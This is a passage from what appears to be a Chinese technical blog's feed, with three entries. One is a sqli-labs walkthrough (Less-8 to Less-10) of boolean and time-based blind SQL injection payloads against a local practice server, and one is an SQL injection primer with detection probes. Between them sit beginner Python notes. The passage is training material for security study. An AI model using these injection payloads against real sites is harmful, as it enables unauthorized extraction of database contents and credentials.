bool盲注</h2><ol><li><p>判断此时存在注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1’ </span><br></pre></td></tr></table></figure></li><li><p>当3改为4的时候，you are in….消失，说明存在三列。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; order by 3--+   </span><br></pre></td></tr></table></figure></li><li><p>猜出来当前第一位是s</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and left((select database()),1)=0x73 --+</span><br></pre></td></tr></table></figure><p>或者是使用： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and ascii(substr((select database()),1,1)) &gt; 16--+ 此时是有回显的。</span><br></pre></td></tr></table></figure></li><li><p>先通过大于号或者小于号来判断数据库的第一个字母是哪一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;17 --+ </span><br></pre></td></tr></table></figure><p>也可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1)) = 115--+ </span><br></pre></td></tr></table></figure><p>此时可以验证数据库中第五个数据库的第一个字母是s</p></li><li><p>判断security数据库中的第4个表中的数据的第一位是否大于11</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 3,1),1,1)) &gt;11 --+ </span><br></pre></td></tr></table></figure><p>也可以使用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 3,1),1,1)) =117 --+ </span><br></pre></td></tr></table></figure><p>验证数据库中第4个表中的数据的第一位的第一个字母的ascii码是否是117，也就是 u</p></li><li><p>同理，进行判断表中的字段，然后进行判断。可以得到username，password；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and  ascii(substr((select column_name from information_schema.columns where table_name = 0x7573657273 limit 1,1),1,1)) &gt;10 --+ </span><br></pre></td></tr></table></figure></li><li><p>同理，进行判断，最后再使用password进行判断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and ascii(substr((select username from security.users limit 0,1),1,1)) &gt;10 --+ </span><br></pre></td></tr></table></figure></li><li><p>因为猜解速度较慢，可以配合burpsuite或者是sqlmap的脚本来使用。</p></li></ol><h2 id="Less-8-时间盲注"><a href="#Less-8-时间盲注" class="headerlink" title="Less-8  时间盲注"></a>Less-8  时间盲注</h2><ul><li>IF(condition,A,B)如果条件condition为true，则执行语句A，否则执行B</li></ul><ol><li>使用延迟的方法判断是否存在注入漏洞。当然判断是否存在注入漏洞的方法很多。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and sleep(5)--+ </span><br></pre></td></tr></table></figure></li><li>当为8的时候很快加载，而为其他值得时候加载较慢（5s左右），那就说明此时数据库的长度就是8（security）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and if(length(database()) = 8,1,sleep(5))--+ </span><br></pre></td></tr></table></figure></li><li>如果当前数据库的第一个字母的ascii值大于113的时候，会立刻返回结果，否则执行5s。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and if(ascii(substr((select database()),1,1)) &gt;113,1,sleep(5))--+</span><br></pre></td></tr></table></figure></li><li>同理判断数据库中的第5个数据库的第一位的ascii的值是不是大于112（实际中是115），如果是的则速度返回，否则延时5s返回结果。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))&gt;112,1,sleep(5))--+ </span><br></pre></td></tr></table></figure></li><li>其余步骤与法一基本类似，可以采用burpsuite或者是sql盲注脚本使用。</li></ol><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><ol><li>当使用order by的时候，此时无论如何都是回显you are in….所以无法使用order by进行判断。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/?id=1&#x27; order by 3999--+ </span><br></pre></td></tr></table></figure></li><li>当存在注入漏洞时，可以使用延迟注入进行判断，此时若存在漏洞，则睡眠5s之后再返回结果。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/?id=1&#x27; and sleep(5)--+ </span><br></pre></td></tr></table></figure></li><li>通过返回时间进行判断，此时如果数据库长度为8，则可以较快返回。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/?id=1&#x27; and if(length(database())=8,1,sleep(5)); </span><br></pre></td></tr></table></figure></li><li>使用less-8中同样的方法进行判断即可!<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/?id=1&#x27; and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))&gt;1112,1,sleep(5))--+ </span><br></pre></td></tr></table></figure></li><li>因为盲注属于猜解，推荐使用脚本进行操作。<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1>1.只是将less-9中的单引号换成了双引号，其余的均相同。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-10/?id=1&quot; and sleep(11)--+ </span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习笔记</title>
      <link href="/archives/743c31e9.html"/>
      <url>/archives/743c31e9.html</url>
      
        <content type="html"><![CDATA[<h1 id="鱼C-python笔记-一直更新在此页"><a href="#鱼C-python笔记-一直更新在此页" class="headerlink" title="鱼C python笔记(一直更新在此页)"></a>鱼C python笔记(一直更新在此页)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1c4411e77t?p=1&amp;vd_source=cc5a1628821098205422c5d510806bf5</span><br></pre></td></tr></table></figure><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>python下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.python.org/downloads/</span><br></pre></td></tr></table></figure><ul><li>下载最新版本即可,安装第一步时点上<code>add python  版本号 to PATH</code></li><li>编辑器使用<code>IDLE</code></li></ul><h1 id="第一行代码"><a href="#第一行代码" class="headerlink" title="第一行代码"></a>第一行代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (&quot;hello world&quot;)</span><br></pre></td></tr></table></figure><h1 id="用python设计第一个游戏"><a href="#用python设计第一个游戏" class="headerlink" title="用python设计第一个游戏"></a>用python设计第一个游戏</h1><p>首先点击左上角<code>file</code>然后<code>new file</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot; 用python设计第一个游戏 &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">temp = input (&quot;不妨猜一下我心想的哪个数字&quot;)</span><br><span class="line">guess = int(temp)</span><br><span class="line"></span><br><span class="line">if guess == 8:</span><br><span class="line">   print (&quot;haha,猜中了&quot;)</span><br><span class="line">else:</span><br><span class="line">    print (&quot;猜错了&quot;)</span><br><span class="line"></span><br><span class="line">print (&quot;游戏结束&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="查看内置函数"><a href="#查看内置函数" class="headerlink" title="查看内置函数"></a>查看内置函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir (__builtins__)</span><br></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><ul><li>变量名不能用数字开头.</li><li>变量名区分大小写.</li><li>python 3 支持中文变量名.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = 3</span><br><span class="line">print (x)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = 3</span><br><span class="line">y = 3</span><br><span class="line">y = x</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = 3</span><br><span class="line">y = 5</span><br><span class="line">x = y</span><br><span class="line">y = z</span><br><span class="line">print (x,y)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = 3</span><br><span class="line">y = 5</span><br><span class="line">x,y = y,x</span><br><span class="line">print (x,y)</span><br></pre></td></tr></table></figure></li></ul><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (&#x27;I LOVE CHINA&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (&quot;I LOVE CHINA&quot;)</span><br></pre></td></tr></table></figure><ul><li>双引号内有单引号<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (&quot; let&#x27;s go ! &quot;)</span><br></pre></td></tr></table></figure></li><li>单引号内有双引号<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (&#x27; &quot; 永远不要只满足于世界的表象，要敢于探寻未知的可能。 &quot; &#x27;)</span><br></pre></td></tr></table></figure><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2></li><li>一句话既有单引号又有双引号<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (&#x27; \&quot; 敢于探寻未知的可能,let\&#x27;s go ! &quot; &#x27;)</span><br></pre></td></tr></table></figure></li><li>换行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (&#x27; \&quot; 敢于探寻未知的可能 \n let\&#x27;s go ! &quot; &#x27;)</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">\(在行尾时)续行符</span><br><span class="line">\\反斜杠符号</span><br><span class="line">\’单引号</span><br><span class="line">\”双引号</span><br><span class="line">\a响铃</span><br><span class="line">\b退格(Backspace)</span><br><span class="line">\e转义</span><br><span class="line">\000空</span><br><span class="line">\n换行</span><br><span class="line">\v纵向制表符</span><br><span class="line">\t横向制表符</span><br><span class="line">\r回车</span><br><span class="line">\f换页</span><br><span class="line">\oyy八进制数yy代表的字符，例如：\o12代表换行</span><br><span class="line">\xyy十进制数yy代表的字符，例如：\x0a代表换行</span><br><span class="line">\other其它的字符以普通格式输出</span><br></pre></td></tr></table></figure><ul><li>原始字符串<blockquote><p>未使用原始字符串语法</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (&quot; D:\three\two\one\now &quot;)   顺序会错乱</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (&quot; D:\\three\\two\\one\\now &quot;)  再加一层转义字符,但是比较麻烦.</span><br></pre></td></tr></table></figure><blockquote><p>使用原始字符串语法</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (r&quot; D:\three\two\one\now &quot;)  加上小写字母 r </span><br></pre></td></tr></table></figure><hr><ul><li>末尾再加一个转义符<code>\</code>表示还没结束.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">poetry = &quot;&quot;&quot;</span><br><span class="line">将进酒·君不见</span><br><span class="line"></span><br><span class="line">【作者】李白 【朝代】唐译文对照</span><br><span class="line"></span><br><span class="line">君不见，黄河之水天上来，奔流到海不复回。</span><br><span class="line"></span><br><span class="line">君不见，高堂明镜悲白发，朝如青丝暮成雪。</span><br><span class="line"></span><br><span class="line">人生得意须尽欢，莫使金樽空对月。</span><br><span class="line"></span><br><span class="line">天生我材必有用，千金散尽还复来。</span><br><span class="line"></span><br><span class="line">烹羊宰牛且为乐，会须一饮三百杯。</span><br><span class="line"></span><br><span class="line">岑夫子，丹丘生，将进酒，杯莫停。</span><br><span class="line"></span><br><span class="line">与君歌一曲，请君为我倾耳听。</span><br><span class="line"></span><br><span class="line">钟鼓馔玉不足贵，但愿长醉不愿醒。</span><br><span class="line"></span><br><span class="line">古来圣贤皆寂寞，惟有饮者留其名。</span><br><span class="line"></span><br><span class="line">陈王昔时宴平乐，斗酒十千恣欢谑。</span><br><span class="line"></span><br><span class="line">主人何为言少钱，径须沽取对君酌。</span><br><span class="line"></span><br><span class="line">五花马，千金裘，呼儿将出换美酒，与尔同销万古愁。</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (poetry)</span><br></pre></td></tr></table></figure><hr><h1 id="字符串加减乘除"><a href="#字符串加减乘除" class="headerlink" title="字符串加减乘除"></a>字符串加减乘除</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">520 + 1314</span><br></pre></td></tr></table></figure><p>1834  </p><hr><ul><li>加法 拼接<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;520&#x27; + &#x27;1314&#x27;</span><br></pre></td></tr></table></figure>‘5201314’</li></ul><hr><ul><li>乘法 复制<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (&quot; 爱你三千遍 &quot; * 3000)</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="是时候讲讲代码了"><a href="#是时候讲讲代码了" class="headerlink" title="是时候讲讲代码了"></a>是时候讲讲代码了</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot; 用python设计第一个游戏 &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">temp = input (&quot;不妨猜一下我心想的哪个数字&quot;)</span><br><span class="line">guess = int(temp)</span><br><span class="line"></span><br><span class="line">if guess == 8:</span><br><span class="line">   print (&quot;haha,猜中了&quot;)</span><br><span class="line">else:</span><br><span class="line">    print (&quot;猜错了&quot;)</span><br><span class="line"></span><br><span class="line">print (&quot;游戏结束&quot;)</span><br></pre></td></tr></table></figure><ul><li>temp 与用户交互<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">temp = input (&quot;aaaaa&quot;)</span><br><span class="line">aaaaa111</span><br><span class="line">print (temp)</span><br><span class="line">111</span><br></pre></td></tr></table></figure><h1 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;大于，如果&gt;前面的值大于后面的值，则返回 True，否则返回 False。</span><br><span class="line">&lt;小于，如果&lt;前面的值小于后面的值，则返回 True，否则返回 False。</span><br><span class="line">==等于，如果==两边的值相等，则返回 True，否则返回 False。</span><br><span class="line">&gt;=大于等于（等价于数学中的 ≥），如果&gt;=前面的值大于或者等于后面的值，则返回 True，否则返回 False。</span><br><span class="line">&lt;=小于等于（等价于数学中的 ≤），如果&lt;=前面的值小于或者等于后面的值，则返回 True，否则返回 False。</span><br><span class="line">!=不等于（等价于数学中的 ≠），如果!=两边的值不相等，则返回 True，否则返回 False。</span><br><span class="line">is判断两个变量所引用的对象是否相同，如果相同则返回 True，否则返回 False。</span><br><span class="line">is not判断两个变量所引用的对象是否不相同，如果不相同则返回 True，否则返回 False。</span><br></pre></td></tr></table></figure></li></ul><h1 id="改进小游戏"><a href="#改进小游戏" class="headerlink" title="改进小游戏"></a>改进小游戏</h1><h2 id="增加提示"><a href="#增加提示" class="headerlink" title="增加提示"></a>增加提示</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot; 用python设计第一个游戏 &quot;&quot;&quot;</span><br><span class="line">temp = input (&quot;不妨猜一下我心想的哪个数字&quot;)</span><br><span class="line">guess = int(temp)</span><br><span class="line"></span><br><span class="line">if guess == 8:</span><br><span class="line">   print (&quot;haha,猜中了&quot;)</span><br><span class="line">else:</span><br><span class="line">    if guess &lt; 8 :</span><br><span class="line">        print (&quot;数字小了&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print (&quot;数字大了&quot;)   </span><br><span class="line">print (&quot;游戏结束&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="增加游戏次数"><a href="#增加游戏次数" class="headerlink" title="增加游戏次数"></a>增加游戏次数</h1><ul><li>注意缩进<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">counts = 3</span><br><span class="line">while counts &gt; 0:  </span><br><span class="line">    temp = input (&quot;不妨猜一下我心想的哪个数字&quot;)</span><br><span class="line">    guess = int(temp)</span><br><span class="line"></span><br><span class="line">    if guess == 8:</span><br><span class="line">       print (&quot;haha,猜中了&quot;)</span><br><span class="line">    else:</span><br><span class="line">        if guess &lt; 8 :</span><br><span class="line">            print (&quot;数字小了&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print (&quot;数字大了&quot;)</span><br><span class="line">    counts = counts - 1    </span><br><span class="line">    print (&quot;游戏结束&quot;)</span><br></pre></td></tr></table></figure><h2 id="break-跳出循环"><a href="#break-跳出循环" class="headerlink" title="break 跳出循环"></a>break 跳出循环</h2></li><li>答对只显示一次 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">counts = 3</span><br><span class="line">while counts &gt; 0:  </span><br><span class="line">    temp = input (&quot;不妨猜一下我心想的哪个数字&quot;)</span><br><span class="line">    guess = int(temp)</span><br><span class="line"></span><br><span class="line">    if guess == 8:</span><br><span class="line">       print (&quot;haha,猜中了&quot;)</span><br><span class="line">       break</span><br><span class="line">    else:</span><br><span class="line">        if guess &lt; 8 :</span><br><span class="line">            print (&quot;数字小了&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print (&quot;数字大了&quot;)</span><br><span class="line">    counts = counts - 1    </span><br><span class="line">    print (&quot;游戏结束&quot;)</span><br></pre></td></tr></table></figure><h1 id="每次运行答案是随机的"><a href="#每次运行答案是随机的" class="headerlink" title="每次运行答案是随机的"></a>每次运行答案是随机的</h1><h2 id="random-模块"><a href="#random-模块" class="headerlink" title="random 模块"></a>random 模块</h2><h2 id="查看文档"><a href="#查看文档" class="headerlink" title="查看文档"></a>查看文档</h2></li><li>点击菜单栏<code>help</code>选择<code>python docs</code> 左边可搜索关键字.<br>导入<code>random</code>模块 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br></pre></td></tr></table></figure></li><li>随机获取1-10之间的数字<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random.randint(1,10)</span><br></pre></td></tr></table></figure><h2 id="答案是随机1-10之间的数字"><a href="#答案是随机1-10之间的数字" class="headerlink" title="答案是随机1-10之间的数字"></a>答案是随机1-10之间的数字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">counts = 3</span><br><span class="line">answer = random.randint(1,10)</span><br><span class="line">while counts &gt; 0:  </span><br><span class="line">    temp = input (&quot;不妨猜一下我心想的哪个数字&quot;)</span><br><span class="line">    guess = int(temp)</span><br><span class="line"></span><br><span class="line">    if guess == answer:</span><br><span class="line">       print (&quot;haha,猜中了&quot;)</span><br><span class="line">       break</span><br><span class="line">    else:</span><br><span class="line">        if guess &lt; answer :</span><br><span class="line">            print (&quot;数字小了&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print (&quot;数字大了&quot;)</span><br><span class="line">    counts = counts - 1    </span><br><span class="line">    print (&quot;游戏结束&quot;)</span><br></pre></td></tr></table></figure></li></ul><h1 id="随机数重现"><a href="#随机数重现" class="headerlink" title="随机数重现"></a>随机数重现</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = random.getstate()</span><br><span class="line">print (x)</span><br><span class="line">random.randint(1,10)</span><br><span class="line"></span><br><span class="line">random.setstate(x)</span><br><span class="line">random.randint(1,10)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/archives/e73517db.html"/>
      <url>/archives/e73517db.html</url>
      
        <content type="html"><![CDATA[<h1 id="注入漏洞形成原理"><a href="#注入漏洞形成原理" class="headerlink" title="注入漏洞形成原理"></a>注入漏洞形成原理</h1><ul><li>sql注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行，从而导致数据泄露，丢失甚至服务器瘫痪。如果代码中没有过滤或者过滤不严谨是会出现漏洞的。</li></ul><h1 id="网站分类"><a href="#网站分类" class="headerlink" title="网站分类"></a>网站分类</h1><h2 id="静态网页："><a href="#静态网页：" class="headerlink" title="静态网页："></a>静态网页：</h2><ul><li>html或者htm，是一种静态的页面格式，不需要服务器解析其中的脚本。由浏览器如(IE、Chrome等)解析。</li></ul><ol><li>不依赖数据库</li><li>灵活性差，制作、更新、维护麻烦</li><li>交互性较差，在功能方面有较大的限制</li><li>安全，不存在SQL注入漏洞</li></ol><h2 id="动态网页："><a href="#动态网页：" class="headerlink" title="动态网页："></a>动态网页：</h2><ul><li>asp、aspx、php、jsp等，由相应的脚本引擎来解释执行，根据指令生成静态网页。</li></ul><ol><li>依赖数据库</li><li>灵活性好，维护简便</li><li>交互性好，功能强大</li><li>存在安全风险，可能存在SQL注入漏洞</li></ol><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><img src="/img/Sql注入 (2).jpeg"><h1 id="注入时信息收集"><a href="#注入时信息收集" class="headerlink" title="注入时信息收集"></a>注入时信息收集</h1><img src="/img/Sql注入- 2 (2).jpeg"><h1 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h1><p>and 1&#x3D;1 正常<br>and 1&#x3D;2 错误<br>可能存在注入，其实归根结底就是看我们的输入会不会对网站造成影响，即我们的操作有效<br>单引号:<code>&#39;</code>  <code>/</code>和 <code>－0</code></p><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><ul><li>access<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from msysobjects)&gt;0</span><br></pre></td></tr></table></figure></li><li>sqlserver<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from sysobjects)&gt;0</span><br></pre></td></tr></table></figure></li><li>判断数据库表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from admin)</span><br></pre></td></tr></table></figure></li><li>判断数据库列名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (select admin from admin)</span><br></pre></td></tr></table></figure><h1 id="工具扫描"><a href="#工具扫描" class="headerlink" title="工具扫描"></a>工具扫描</h1>Awvs、burp、appscan、sqlmap</li></ul><h1 id="SQL注入-Sqlserver"><a href="#SQL注入-Sqlserver" class="headerlink" title="SQL注入- Sqlserver"></a>SQL注入- Sqlserver</h1><p><a 